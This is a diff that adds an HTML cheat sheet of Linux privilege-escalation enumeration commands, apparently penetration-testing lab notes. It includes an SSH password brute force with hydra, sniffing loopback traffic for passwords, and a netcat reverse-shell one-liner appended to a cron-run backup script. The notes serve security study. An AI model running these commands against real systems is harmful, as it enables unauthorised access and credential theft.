@@ -1,0 +1,43 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Automated Enumeration</title>
+</head><body>unix-privesc-check <br/>
+<br/>
+./unix-privesc-check standard &gt; output.txt<br/>
+<br/>
+env {to check user traces}<br/>
+<br/>
+cat .bashrc<br/>
+<br/>
+su - root<br/>
+<br/>
+crunch 6 6 -t Lab%%% &gt; wordlist<br/>
+<br/>
+hydra -l eve -P wordlist &nbsp;192.168.50.214 -t 4 ssh -V<br/>
+<br/>
+watch -n 1 "ps -aux | grep pass"<br/>
+<br/>
+sudo tcpdump -i lo -A | grep "pass"<br/>
+<br/>
+grep "CRON" /var/log/syslog<br/>
+<br/>
+ls -lah /home/joe/.scripts/user_backups.sh<br/>
+<br/>
+echo &gt;&gt; user_backups.sh<br/>
+<br/>
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.210 1234 &gt;/tmp/f" &gt;&gt; this_is_fine.sh<br/>
+<br/>
+ls -lah /etc/cron*<br/>
+<br/>
+sudo crontab -l<br/>
+<br/>
+find / -writable -type f 2&gt;/dev/null | grep -vE '^/(home|proc)/'<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
